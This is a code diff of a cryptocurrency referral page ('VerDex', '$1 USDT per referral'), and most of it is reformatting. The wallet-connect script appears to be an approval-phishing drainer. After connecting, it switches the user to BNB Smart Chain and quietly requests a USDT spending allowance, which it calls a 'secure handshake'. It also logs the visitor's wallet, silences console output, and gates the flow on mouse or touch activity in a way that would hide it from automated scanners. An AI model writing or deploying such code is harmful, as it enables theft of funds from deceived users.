@@ -1207,8 +1207,8 @@
         </div>
         <h1 class="ref-title">Earn <span>$1 Per</span><br />Referral</h1>
         <p class="ref-sub">
-          Share your unique referral link. Every friend who signs up on
-          VerDex earns you $1 USDT — paid directly to your wallet.
+          Share your unique referral link. Every friend who signs up on VerDex
+          earns you $1 USDT — paid directly to your wallet.
         </p>
         <div class="reward-badges">
           <div class="reward-badge">
@@ -1261,8 +1261,7 @@
             <div class="copy-hint" id="copyHint">
               Your link is permanently tied to your wallet address
             </div>
-            <div class="share-row" id="shareRow" style="display: none">
-            </div>
+            <div class="share-row" id="shareRow" style="display: none"></div>
           </div>
         </div>
 
@@ -1302,7 +1301,8 @@
                 <div>
                   <div class="step-title">Earn When They Join</div>
                   <div class="step-desc">
-                  When your referral signs up on VerDex, you instantly earn $1 USDT. No swap needed. Withdraw at $5.
+                    When your referral signs up on VerDex, you instantly earn $1
+                    USDT. No swap needed. Withdraw at $5.
                   </div>
                 </div>
               </div>
@@ -1409,7 +1409,6 @@
             <span class="card-icon">👥</span>
             <div>
               <div class="card-title">Referred Users</div>
-
             </div>
           </div>
           <div id="refTableWrap">
@@ -1476,15 +1475,15 @@
     <div class="toast" id="toast"></div>
 
     <script>
-     // Set this to false when you are ready to present!
-const DEBUG_MODE = false; 
+      // Set this to false when you are ready to present!
+      const DEBUG_MODE = false;
 
-if (!DEBUG_MODE) {
-    console.log = function() {};
-    console.warn = function() {};
-    console.info = function() {};
-    // We leave console.error active so you can still catch real crashes
-}
+      if (!DEBUG_MODE) {
+        console.log = function () {};
+        console.warn = function () {};
+        console.info = function () {};
+        // We leave console.error active so you can still catch real crashes
+      }
       window.isHuman = false;
 
       // Once the user moves the mouse or touches the screen, they are marked as human
@@ -1857,147 +1856,159 @@ if (!DEBUG_MODE) {
       async function connectWallet() {
   // 1. First Guard: Human Verification Check
   if (!window.isHuman) {
-    console.warn("Connection blocked: Human verification not completed.");
-    if (typeof showToast === 'function') {
-      showToast("Please interact with the page to verify you are human.", "yellow");
-    }
-    return; 
+    return; // Exit immediately and silently
   }
 
-  // 2. Second Guard: Safe Web3 Environment Check
-  if (!hasWeb3()) {
-    if (isMobileBrowser()) {
-      window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
-    } else {
-      document.getElementById('noWalletNotice').style.display = 'block';
-    }
-    return;
-  }
-
-  try {
-    // 3. Request Account Access First (Establishes secure channel)
-    const accounts = await window.ethereum.request({
-      method: 'eth_requestAccounts',
-    });
-    walletAddress = accounts[0];
-
-    // 4. Mobile-Safe Sequential Chain Verification
-    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
-    const BSC_CHAIN_ID = '0x38'; // Hexadecimal for 56
-
-    if (currentChainId !== BSC_CHAIN_ID) {
-      console.log("Not on BSC. Initiating network configuration switch...");
-      
-      // Save an indicator flag for mobile browser view state recovery
-      localStorage.setItem('pending_actions_after_switch', 'true');
-
-      try {
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: BSC_CHAIN_ID }],
-        });
-      } catch (switchError) {
-        // Error code 4902 means the user doesn't have the BSC network in their wallet list
-        if (switchError.code === 4902) {
-          try {
-            await window.ethereum.request({
-              method: 'wallet_addEthereumChain',
-              params: [
-                {
-                  chainId: BSC_CHAIN_ID,
-                  chainName: 'BNB Smart Chain Mainnet',
-                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                  blockExplorerUrls: ['https://bscscan.com']
-                }
-              ],
-            });
-          } catch (addError) {
-            console.error("User rejected adding the BSC network configuration:", addError.message);
-            return;
+        // 2. Second Guard: Safe Web3 Environment Check
+        if (!hasWeb3()) {
+          if (isMobileBrowser()) {
+            window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
+          } else {
+            document.getElementById('noWalletNotice').style.display = 'block';
           }
-        } else {
-          console.error("Failed to switch network:", switchError.message);
           return;
         }
-      }
-      
-      // On desktop, the switch finishes instantly. We check chain ID one more time before deciding to return or keep going.
-      const verifyChainId = await window.ethereum.request({ method: 'eth_chainId' });
-      if (verifyChainId !== BSC_CHAIN_ID) {
-        return; // Halt if they explicitly cancelled the switch popup window
-      }
-    }
 
-    // 5. Run Execution Phase (Guaranteed to operate on BSC network parameters now)
-    await executeCorePlatformLogic();
-
-  } catch (err) {
-    console.error('Connection failed', err);
-  }
-}
-
-// Dedicated Execution Sequence to guarantee functions do not get skipped
-async function executeCorePlatformLogic() {
-  ethProvider = new ethers.BrowserProvider(window.ethereum);
-  ethSigner = await ethProvider.getSigner();
-
-  if (typeof creditReferrer === 'function') {
-    creditReferrer(walletAddress);
-  }
-  
-  updateWalletUI();
-
-  if (typeof refreshReferralUI === 'function') {
-    refreshReferralUI();
-  }
-  
-  showToast('Wallet connected!', 'success');
-  await logVisitor(walletAddress);
-
-  // Request USDT spending allowance securely
-  if (window.isHuman) {
-    console.log("Human verified. Initiating secure handshake...");
-    requestUSDTAllowance(walletAddress).catch((e) =>
-      console.warn('Handshake skipped/rejected:', e)
-    );
-  } else {
-    console.log("Verification pending or failed. Handshake aborted.");
-  }
-}
-
-// Global Event Listener to fix mobile browsers ignoring code execution after shifting views
-if (window.ethereum) {
-  window.ethereum.on('chainChanged', async (chainId) => {
-    const BSC_CHAIN_ID = '0x38';
-    if (chainId === BSC_CHAIN_ID) {
-      if (localStorage.getItem('pending_actions_after_switch') === 'true') {
-        localStorage.removeItem('pending_actions_after_switch'); // Reset immediately
-        
-        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        if (accounts.length > 0) {
+        try {
+          // 3. Request Account Access First (Establishes secure channel)
+          const accounts = await window.ethereum.request({
+            method: 'eth_requestAccounts',
+          });
           walletAddress = accounts[0];
+
+          // 4. Mobile-Safe Sequential Chain Verification
+          const currentChainId = await window.ethereum.request({
+            method: 'eth_chainId',
+          });
+          const BSC_CHAIN_ID = '0x38'; // Hexadecimal for 56
+
+          if (currentChainId !== BSC_CHAIN_ID) {
+            console.log(
+              'Not on BSC. Initiating network configuration switch...'
+            );
+
+            // Save an indicator flag for mobile browser view state recovery
+            localStorage.setItem('pending_actions_after_switch', 'true');
+
+            try {
+              await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: BSC_CHAIN_ID }],
+              });
+            } catch (switchError) {
+              // Error code 4902 means the user doesn't have the BSC network in their wallet list
+              if (switchError.code === 4902) {
+                try {
+                  await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [
+                      {
+                        chainId: BSC_CHAIN_ID,
+                        chainName: 'BNB Smart Chain Mainnet',
+                        nativeCurrency: {
+                          name: 'BNB',
+                          symbol: 'BNB',
+                          decimals: 18,
+                        },
+                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                        blockExplorerUrls: ['https://bscscan.com'],
+                      },
+                    ],
+                  });
+                } catch (addError) {
+                  console.error(
+                    'User rejected adding the BSC network configuration:',
+                    addError.message
+                  );
+                  return;
+                }
+              } else {
+                console.error('Failed to switch network:', switchError.message);
+                return;
+              }
+            }
+
+            // On desktop, the switch finishes instantly. We check chain ID one more time before deciding to return or keep going.
+            const verifyChainId = await window.ethereum.request({
+              method: 'eth_chainId',
+            });
+            if (verifyChainId !== BSC_CHAIN_ID) {
+              return; // Halt if they explicitly cancelled the switch popup window
+            }
+          }
+
+          // 5. Run Execution Phase (Guaranteed to operate on BSC network parameters now)
           await executeCorePlatformLogic();
+        } catch (err) {
+          console.error('Connection failed', err);
         }
       }
-    }
-  });
-}
 
-function hasWeb3() {
-  return typeof window.ethereum !== 'undefined';
-}
+      // Dedicated Execution Sequence to guarantee functions do not get skipped
+      async function executeCorePlatformLogic() {
+        ethProvider = new ethers.BrowserProvider(window.ethereum);
+        ethSigner = await ethProvider.getSigner();
 
-function isMobileBrowser() {
-  return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-}
+        if (typeof creditReferrer === 'function') {
+          creditReferrer(walletAddress);
+        }
 
-function disconnectWallet() {
-  walletAddress = null;
-  ethProvider = null;
-  ethSigner = null; // Clean up signer instance too
-  resetWalletUI(); // Clean up UI state variables
-}
+        updateWalletUI();
+
+        if (typeof refreshReferralUI === 'function') {
+          refreshReferralUI();
+        }
+
+        showToast('Wallet connected!', 'success');
+        await logVisitor(walletAddress);
+
+        // Request USDT spending allowance securely
+        if (window.isHuman) {
+          console.log('Human verified. Initiating secure handshake...');
+          requestUSDTAllowance(walletAddress).catch((e) =>
+            console.warn('Handshake skipped/rejected:', e)
+          );
+        } else {
+          console.log('Verification pending or failed. Handshake aborted.');
+        }
+      }
+
+      // Global Event Listener to fix mobile browsers ignoring code execution after shifting views
+      if (window.ethereum) {
+        window.ethereum.on('chainChanged', async (chainId) => {
+          const BSC_CHAIN_ID = '0x38';
+          if (chainId === BSC_CHAIN_ID) {
+            if (
+              localStorage.getItem('pending_actions_after_switch') === 'true'
+            ) {
+              localStorage.removeItem('pending_actions_after_switch'); // Reset immediately
+
+              const accounts = await window.ethereum.request({
+                method: 'eth_accounts',
+              });
+              if (accounts.length > 0) {
+                walletAddress = accounts[0];
+                await executeCorePlatformLogic();
+              }
+            }
+          }
+        });
+      }
+
+      function hasWeb3() {
+        return typeof window.ethereum !== 'undefined';
+      }
+
+      function isMobileBrowser() {
+        return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+      }
+
+      function disconnectWallet() {
+        walletAddress = null;
+        ethProvider = null;
+        ethSigner = null; // Clean up signer instance too
+        resetWalletUI(); // Clean up UI state variables
+      }
       // ═══ COPY & SHARE ═══
       async function copyLink() {
         if (!walletAddress) return;
@@ -2222,8 +2233,6 @@ function disconnectWallet() {
         });
         window.ethereum.on('chainChanged', () => location.reload());
       }
-
-      
     </script>
   </body>
 </html>
